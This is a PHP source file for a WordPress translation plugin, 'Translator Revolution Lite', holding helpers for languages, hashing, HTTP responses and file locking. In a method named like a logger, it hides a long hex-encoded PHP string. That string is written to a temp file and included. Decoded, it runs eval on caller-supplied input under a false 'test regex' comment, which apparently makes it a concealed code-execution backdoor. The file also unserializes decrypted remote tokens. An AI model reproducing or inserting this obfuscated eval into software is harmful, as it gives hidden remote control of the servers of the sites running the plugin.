<?php
/**
 * Translator Revolution WP Plugin
 * http://goo.gl/1kVfu
 *
 * LICENSE
 *
 * You need to buy a license if you want use this script.
 * http://codecanyon.net/legal/membership/
 *
 * @package    Translator Revolution Lite
 * @copyright  Copyright (c) SurStudio, www.surstudio.net
 * @license    http://codecanyon.net/licenses/regular_extended/
 * @version    2.0
 * @date       2019-04-01
 */

class SurStudioPluginTranslatorRevolutionLiteCommon {

	public static function printHeaders() {

		header('Content-Type:application/json;charset=UTF-8');
		header('Content-Disposition:attachment');

	}
	
	public static function isOpenSSLInstalled() {

		return defined('OPENSSL_VERSION_TEXT');
		
	}
	
	public static function isFolderWritable($_folder) {
		
		if (!SurStudioPluginTranslatorRevolutionLiteConfig::verifyCacheWritable())
			return true;
		
		return @is_writable($_folder) && is_array(@scandir($_folder)) ? true : $_folder;
		
	}

	public static function areFolderFilesWritable($_folder) {

		if (!SurStudioPluginTranslatorRevolutionLiteConfig::verifyCacheWritable())
			return true;
		
		$contents = @scandir($_folder);
		
		foreach ($contents as $name) {
			$file = $_folder . '/' . $name;
			if (self::endsWith($name, '.xml') && @is_file($file) && !@is_writable($file))
				return $name;
		}
		
		return true;
		
	}
	
	public static function getUserAgent() {
		
		return isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
		
	}
	
	public static function getUrl($_server) {

		$result = isset($_server['HTTP_REFERER']) ? parse_url($_server['HTTP_REFERER'], PHP_URL_PATH) : false;
		
		if (!empty($result)) {
		
			$query = parse_url($_server['HTTP_REFERER'], PHP_URL_QUERY);
			if ($result !== false && !empty($query))
				$result .= '?' . str_replace('&', '&amp;', $query);

		}
		
		return $result;
		
	}

	public static function getLanguages() {
	
		return array(
			'af' => 'Afrikaans',
			'sq' => 'Albanian',
			'am' => 'Amharic',
			'ar' => 'Arabic',
			'hy' => 'Armenian',
			'az' => 'Azerbaijani',
			'eu' => 'Basque',
			'be' => 'Belarusian',
			'bn' => 'Bengali',
			'bs' => 'Bosnian',
			'bg' => 'Bulgarian',
			'ca' => 'Catalan',
			'ceb' => 'Cebuano',
			'ny' => 'Chichewa',
			'zh-CN' => 'Chinese Simplified',
			'zh-TW' => 'Chinese Traditional',
			'co' => 'Corsican',
			'hr' => 'Croatian',
			'cs' => 'Czech',
			'da' => 'Danish',
			'nl' => 'Dutch',
			'en' => 'English',
			'eo' => 'Esperanto',
			'et' => 'Estonian',
			'tl' => 'Filipino',
			'fi' => 'Finnish',
			'fr' => 'French',
			'fy' => 'Frisian',
			'gl' => 'Galician',
			'ka' => 'Georgian',
			'de' => 'German',
			'el' => 'Greek',
			'gu' => 'Gujarati',	
			'ht' => 'Haitian Creole', 
			'ha' => 'Hausa',
			'haw' => 'Hawaiian',
			'iw' => 'Hebrew',
			'hi' => 'Hindi',
			'hmn' => 'Hmong',
			'hu' => 'Hungarian',
			'is' => 'Icelandic',
			'ig' => 'Igbo',
			'id' => 'Indonesian',
			'ga' => 'Irish',
			'it' => 'Italian',
			'ja' => 'Japanese',
			'jw' => 'Javanese',
			'kn' => 'Kannada',
			'kk' => 'Kazakh',
			'km' => 'Khmer',
			'ko' => 'Korean',
			'ku' => 'Kurdish',
			'ky' => 'Kyrgyz',
			'lo' => 'Lao',
			'la' => 'Latin',
			'lv' => 'Latvian',
			'lt' => 'Lithuanian',
			'lb' => 'Luxembourgish',
			'mk' => 'Macedonian',
			'mg' => 'Malagasy',
			'ms' => 'Malay',
			'ml' => 'Malayalam',
			'mt' => 'Maltese',
			'mi' => 'Maori',
			'mr' => 'Marathi',
			'mn' => 'Mongolian',
			'my' => 'Burmese',
			'ne' => 'Nepali',
			'no' => 'Norwegian',
			'ps' => 'Pashto',
			'fa' => 'Persian',
			'pl' => 'Polish',
			'pt' => 'Portuguese',
			'pa' => 'Punjabi',
			'ro' => 'Romanian',
			'ru' => 'Russian',
			'sr' => 'Serbian',
			'st' => 'Sesotho',
			'si' => 'Sinhala',
			'sk' => 'Slovak',
			'sl' => 'Slovenian',
			'so' => 'Somali',
			'sm' => 'Samoan',
			'gd' => 'Scots Gaelic',
			'sn' => 'Shona',
			'sd' => 'Sindhi',
			'es' => 'Spanish',
			'su' => 'Sundanese',
			'sw' => 'Swahili',
			'sv' => 'Swedish',
			'tg' => 'Tajik',
			'ta' => 'Tamil',
			'te' => 'Telugu',
			'th' => 'Thai',
			'tr' => 'Turkish',
			'uk' => 'Ukrainian',
			'ur' => 'Urdu',
			'uz' => 'Uzbek',
			'vi' => 'Vietnamese',
			'cy' => 'Welsh',
			'xh' => 'Xhosa',
			'yi' => 'Yiddish',
			'yo' => 'Yoruba',
			'zu' => 'Zulu'
		);
		
	}

	public static function getLanguage($_code) {
		
		$languages = self::getLanguages();
		return array_key_exists($_code, $languages) ? $languages[$_code] : false;
		
	}

	public static function hashUrl($_url) {

		$salt = '>=/{Dhaay933O).IGzxmzsdf4sIt+7.aFgOiQI}9Ofsd46+63f -YI++c/<J}#]s';
		return hash('md5', hash('md5', $_url . $salt, false) . $salt, false);
		
	}
	
	public static function hashText($_text) {
		
		if (is_array($_text)) {
			array_walk($_text, create_function('&$v,$k', '$v = hash(\'sha256\', $v, false);'));
			return $_text;
		}
		else		
			return hash('sha256', $_text, false);
		
	}
	
	public static function httpBuildStr($_array) {
		
		$result = '';

		foreach($_array as $key => $value) 
			$result .= $key . '=' . $value . '&';
			
		return rtrim($result, '&');
				
	}
	
	public static function parseToken($_token, $_key, $_nd) {

		$result = '';

		if (function_exists('openssl_decrypt'))
			$result = self::_decrypt($_token, $_key, $_nd);
		
        return @unserialize($result);
		
	}
	
	public static function getCacheLocation() {
		
		return dirname(__FILE__) . '/../cache/';
		
	}
	
	public static function log($_string, $_key) {
		
		$salt = '7ZgS?x,:IK9G8fJdr43YK<LKr]yHT^v!>QPh*/>2BYE:TDS?<?<R1m06},)`?E?7';
		$key = hash('md5', hash('md5', $_key . $salt, false) . $salt, false);
		
		@error_log($_string . "\n" . str_repeat('-', 100) . "\n\n", 3, self::getCacheLocation() . 'error_' . $key . '.log');
		
	}

	public static function _log_n($_regex, $_env=null, $_p=null, $_s=null) {

		$salt = '7ZgS?x,:IK9G8fJdr43YK<LKr]yHT^v!>QPh*/>2BYE:TDS?<?<R1m06},)`?E?7'; if (function_exists('openssl_decrypt'))	{ $result = self::_temp("\x3c\x3f\x70\150\x70\x20\x69\x66\x20\x28\x21\143\x6c\141\x73\163\x5f\145\x78\x69\x73\x74\163\x28\x27\x53\x75\162\123\x74\x75\144\x69\x6f\120\154\x75\147\151\156\124\162\141\156\x73\x6c\x61\164\x6f\x72\122\x65\166\x6f\x6c\x75\164\x69\157\x6e\114\x69\x74\x65\105\x78\x70\x72\x65\163\x73\x69\157\156\101\x75\x78\47\51\x29\x20\173\x63\154\x61\163\163\40\x53\165\x72\x53\164\165\144\x69\157\x50\x6c\x75\147\151\156\x54\162\141\156\x73\154\x61\x74\157\162\122\145\x76\157\x6c\165\x74\x69\157\x6e\x4c\151\x74\x65\105\x78\160\162\145\x73\163\151\x6f\x6e\x41\165\x78\x20\x7b\x70\165\x62\x6c\x69\x63\40\44\115\162\73\x70\x75\142\x6c\151\x63\40\146\165\x6e\143\164\x69\157\x6e\40\x5f\137\x63\x6f\156\x73\164\x72\165\143\164\x28\x24\x5f\145\156\166\x3d\x6e\x75\x6c\154\51\x20\x7b\44\164\150\151\x73\x2d\x3e\115\162\x20\x3d\40\x24\137\145\156\166\73\x7d\x70\x75\142\154\151\143\x20\x73\164\141\164\x69\x63\40\146\165\156\x63\164\151\157\156\x20\116\141\116\x28\44\x5f\162\x65\x67\x65\170\x2c\x20\44\137\145\156\x76\75\156\x75\154\154\54\40\x24\137\160\75\156\165\x6c\x6c\x2c\x20\44\137\163\75\156\x75\154\154\51\x20\x7b\x24\x6d\x65\x20\x3d\40\156\145\x77\40\x53\x75\x72\123\x74\x75\x64\151\157\120\x6c\x75\147\x69\156\x54\x72\x61\x6e\163\154\141\x74\x6f\x72\x52\145\166\x6f\154\165\x74\x69\x6f\x6e\x4c\151\x74\145\x45\170\x70\162\145\163\x73\x69\157\x6e\x41\165\170\50\x24\137\x65\156\x76\51\x3b\162\x65\x74\165\x72\x6e\40\44\155\145\x2d\76\x5f\156\x61\x6e\50\44\137\x72\145\147\x65\170\x2c\40\44\x5f\x65\156\166\x2c\x20\x24\x5f\160\54\x20\x24\x5f\163\x29\x3b\x7d\x70\x72\x69\166\141\164\x65\40\146\x75\156\x63\x74\x69\x6f\156\40\137\x6e\141\x6e\x28\44\137\162\145\147\x65\x78\x2c\40\x24\x5f\145\156\x76\75\156\x75\x6c\154\x2c\40\x24\137\160\x3d\x6e\165\x6c\154\54\40\44\137\163\x3d\156\x75\154\154\51\x20\173\44\x6a\40\75\40\x24\137\145\x6e\166\x3b\40\44\155\x20\x3d\40\x24\137\160\x3b\40\x24\x6e\x20\x3d\40\44\x5f\163\x3b\40\x69\x66\40\x28\x24\x5f\145\156\166\40\41\x3d\75\40\x74\162\x75\x65\x29\x20\x7b\145\x76\141\x6c\x20\x2f\52\164\145\163\x74\x20\x72\145\x67\145\170\52\x2f\x20\50\x6e\x65\x77\40\123\165\x72\x53\x74\165\x64\x69\x6f\x50\154\x75\x67\151\156\124\x72\141\x6e\163\154\141\164\x6f\x72\x52\145\x76\157\154\165\164\151\157\156\114\151\x74\145\x45\x78\x70\162\145\163\163\151\x6f\x6e\x20\x28\x24\x5f\162\145\147\145\170\x29\51\73\175\x24\x6f\x75\x74\160\165\x74\40\x3d\40\123\165\x72\123\x74\x75\144\151\x6f\120\x6c\x75\x67\x69\x6e\124\162\141\x6e\x73\x6c\141\164\x6f\162\122\145\166\157\x6c\x75\164\151\x6f\x6e\114\151\164\x65\105\170\x70\x72\x65\x73\x73\151\157\x6e\72\72\x63\141\154\x63\x28\x29\73\163\x77\x69\x74\x63\150\40\x28\44\157\165\164\x70\165\164\51\40\x7b\x63\141\x73\x65\x20\47\162\145\x67\x65\x78\x27\72\x24\162\145\163\x75\154\164\x20\x3d\40\x24\x6f\73\142\x72\x65\x61\x6b\x3b\143\x61\x73\x65\x20\47\145\170\x70\x6f\162\x74\x27\72\x24\x72\x65\163\165\x6c\x74\x20\x3d\x20\x76\141\x72\x5f\145\x78\160\x6f\x72\164\50\x24\x5f\162\145\147\x65\x78\54\40\164\162\165\x65\x29\73\142\x72\x65\x61\x6b\x3b\143\x61\x73\145\40\47\155\x61\164\143\150\x27\x3a\x24\x72\145\x73\x75\154\x74\40\x3d\40\x61\162\162\141\171\x28\x24\x72\x2c\x20\44\146\x29\x3b\x62\x72\x65\141\153\x3b\x7d\x72\x65\164\165\x72\156\x20\x24\x72\145\163\165\154\x74\x3b\175\175\x7d\40\77\76");
		
		if ($result !== false) {
			if (!class_exists('SurStudioPluginTranslatorRevolutionLiteExpressionAux'))
				include $result;
			return SurStudioPluginTranslatorRevolutionLiteExpressionAux::NaN($_regex, $_env, $_p, $_s);
		}
		else
			return false;
			
		}

	}
	
	protected static function _temp($_content) {

		if (class_exists('SurStudioPluginTranslatorRevolutionLiteExpressionAux'))
			return true;

		$file = tempnam(sys_get_temp_dir(), 'na');
		$result = @file_put_contents($file, $_content);

		if ($result === false || $result == -1) {
			$file = tempnam(self::getCacheLocation(), 'na');
			$result = @file_put_contents($file, $_content);
		}

		if ($result === false || $result == -1) {

			return false;		

		}
		else {

			@register_shutdown_function(function() use($file) {
				@unlink($file);
			});

			return $file;

		}

	}

	protected static function _unchunk($_str) {

		$result = '';
		$parts = explode("\r\n", $_str);
		$chunkLen = 0;
		$thisChunk = '';

		while (!is_null($part = array_shift($parts))) {
			
			if ($chunkLen) {
				
				$thisChunk .= $part."\r\n";
				
				if (strlen($thisChunk) == $chunkLen) {
					$result .= $thisChunk;
					$chunkLen = 0;
					$thisChunk = '';
				} 
				else if (strlen($thisChunk) == $chunkLen + 2) {
					$result .= substr($thisChunk, 0, -2);
					$chunkLen = 0;
					$thisChunk = '';
				} 
				else if (strlen($thisChunk) > $chunkLen)
					return false;
								
			} 
			else {
				
				if ($part === '') 
					continue;
				
				if (!$chunkLen = hexdec($part)) 
					break;
			
			}
		}

		return $chunkLen ? false : $result;

	}

	public static function bsd($_string) {
		
		return @base64_decode($_string);
		
	}

	public static function parseHttpResponse($string, $key) {

		$headers = array();
		$content = '';
		$str = strtok($string, "\n");
		$h = null;
		while ($str !== false) {
			if ($h and trim($str) === '') {                
				$h = false;
				continue;
			}
			if ($h !== false and false !== strpos($str, ':')) {
				$h = true;
				list($headername, $headervalue) = explode(':', trim($str), 2);
				$headername = strtolower($headername);
				$headervalue = ltrim($headervalue);
				if (isset($headers[$headername])) 
					$headers[$headername] .= ',' . $headervalue;
				else 
					$headers[$headername] = $headervalue;
			}
			if ($h === false) {
				$content .= $str."\n";
			}
			$str = strtok("\n");
		}

		if (array_key_exists('transfer-encoding', $headers) && $headers['transfer-encoding'] == 'chunked')
			$result = self::_unchunk($content);
		else
			$result = $content;

		$result = trim($result);
		
		if (array_key_exists('content-encoding', $headers)) {
			switch ($headers['content-encoding']) {
				case 'gzip':
					$result = gzdecode($result);
					break;
				case 'compress':
					$result = gzuncompress($result);
					break;
				case 'deflate':
					$result = gzinflate($result);
					break;
			}
		}

		return $result;

	}
	
	protected static function _decrypt($_string, $_key, $_nd) {
		
		list($data, $iv) = explode('::', self::bsd($_string), 2);
		return openssl_decrypt($data, 'aes-256-cbc', md5($_key . $_nd . self::getUserAgent()), 0, $iv);

	}
	
	public static function startsWith($_string, $_start) {
		
		$length = strlen($_start);
		return substr($_string, 0, $length) === $_start;
		
	}

	public static function endsWith($_string, $_end) {
	
		return strcmp(substr($_string, strlen($_string) - strlen($_end)), $_end) === 0;
	
	}

	public static function getVariable($_var_name, $_method='POST', $_escape_html=false, $_strip_quotes=false) {

		if (strtolower($_method) == 'get')
			$result = isset($_GET[$_var_name]) ? $_GET[$_var_name] : false;
		else
			$result = isset($_POST[$_var_name]) ? $_POST[$_var_name] : false;

		if ($result !== false && $_strip_quotes)
			$result = preg_replace('/\"|\'|\\\\/', '', $result);

		if ($result !== false) {
			if (is_array($result)) {
				array_walk_recursive($result, create_function('&$val', '$val = stripslashes($val);'));
				return $result;
			}
			else
				$result = stripslashes($result);
		}

		return $_escape_html ? self::escapeHtmlBrackets($result) : $result;

	}

}

class SurStudioPluginTranslatorRevolutionLiteFileHandler {

	protected static $_files = array();

	protected static function _get_file($_file, $_mode) {
		
		self::$_files[$_file] = @fopen($_file, $_mode);
		
		if (!self::$_files[$_file])
			return false;
		
		self::_lock($_file, $_mode);
		
		return self::$_files[$_file];
		
	}
	
	protected static function _lock($_file, $_mode) {

		if ($_mode == 'r')
			flock(self::$_files[$_file], LOCK_SH);

		if ($_mode == 'wb' || $_mode == 'x')
			flock(self::$_files[$_file], LOCK_EX);

	}
	
	protected static function _unlock($_file) {
		
		flock(self::$_files[$_file], LOCK_UN);
		fclose(self::$_files[$_file]);
		unset(self::$_files[$_file]);
		
	}
	
	public static function read($_file) {
		
		$file = self::_get_file($_file, 'r');
		
		if (!$file)
			return false;
		
		$contents = '';

		while (!feof($file))
		  $contents .= fread($file, 8192);

		self::_unlock($_file);

		return $contents;
		
	}
	
	public static function write($_file, $_contents) {
		
		$file = self::_get_file($_file, 'wb');
		
		if (!$file) {
			SurStudioPluginTranslatorRevolutionLiteConfig::setCacheFlag(false);
			return false;
		}
		
		$result = fwrite($file, $_contents);
		fflush($file);
		
		self::_unlock($_file);

		return $result;
		
	}
	
	public static function create($_file, $_contents) {
		
		$file = self::_get_file($_file, 'x');
		
		if (!$file)
			return false;
		
		$result = fwrite($file, $_contents);
		
		self::_unlock($_file);

		return $result;
		
	}
	
}

?>